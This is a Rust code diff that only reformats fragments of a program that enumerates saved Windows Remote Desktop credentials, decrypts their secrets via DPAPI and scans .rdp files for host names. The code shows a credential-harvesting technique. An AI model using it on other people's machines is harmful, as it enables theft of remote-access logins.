@@ -99,11 +99,8 @@ fn enumerate_termsrv_credentials() -> Result<Vec<(String, u32, String, Vec<u8>)>
             let user = wide_to_string(c.UserName);
             let mut blob = Vec::new();
             if !c.CredentialBlob.is_null() && c.CredentialBlobSize > 0 {
-                blob = std::slice::from_raw_parts(
-                    c.CredentialBlob,
-                    c.CredentialBlobSize as usize,
-                )
-                .to_vec();
+                blob = std::slice::from_raw_parts(c.CredentialBlob, c.CredentialBlobSize as usize)
+                    .to_vec();
             }
             result.push((target, c.Type, user, blob));
         }
@@ -195,7 +192,10 @@ fn dpapi_unprotect(data: &[u8], entropy: Option<&[u8]>) -> Option<Vec<u8>> {
         let entropy_ptr = entropy_storage
             .as_ref()
             .map_or(std::ptr::null(), |b| b as *const DATA_BLOB);
-        let mut blob_out = DATA_BLOB { cbData: 0, pbData: std::ptr::null_mut() };
+        let mut blob_out = DATA_BLOB {
+            cbData: 0,
+            pbData: std::ptr::null_mut(),
+        };
         let ok = ffi::CryptUnprotectData(
             &blob_in,
             std::ptr::null(),
@@ -208,8 +208,7 @@ fn dpapi_unprotect(data: &[u8], entropy: Option<&[u8]>) -> Option<Vec<u8>> {
         if ok == 0 || blob_out.pbData.is_null() {
             return None;
         }
-        let result =
-            std::slice::from_raw_parts(blob_out.pbData, blob_out.cbData as usize).to_vec();
+        let result = std::slice::from_raw_parts(blob_out.pbData, blob_out.cbData as usize).to_vec();
         ffi::LocalFree(blob_out.pbData);
         Some(result)
     }
@@ -232,7 +231,10 @@ fn scan_rdp_files() -> Vec<String> {
     if let Ok(entries) = std::fs::read_dir(&docs) {
         for e in entries.flatten() {
             let p = e.path();
-            if p.is_file() && p.extension().map_or(false, |x| x.eq_ignore_ascii_case("rdp")) {
+            if p.is_file()
+                && p.extension()
+                    .map_or(false, |x| x.eq_ignore_ascii_case("rdp"))
+            {
                 candidates.push(p);
             }
         }
@@ -244,7 +246,9 @@ fn scan_rdp_files() -> Vec<String> {
 
     let mut out = Vec::new();
     for p in candidates {
-        let Ok(content) = std::fs::read_to_string(&p) else { continue };
+        let Ok(content) = std::fs::read_to_string(&p) else {
+            continue;
+        };
         let host = re_host
             .captures(&content)
             .and_then(|c| c.get(1))
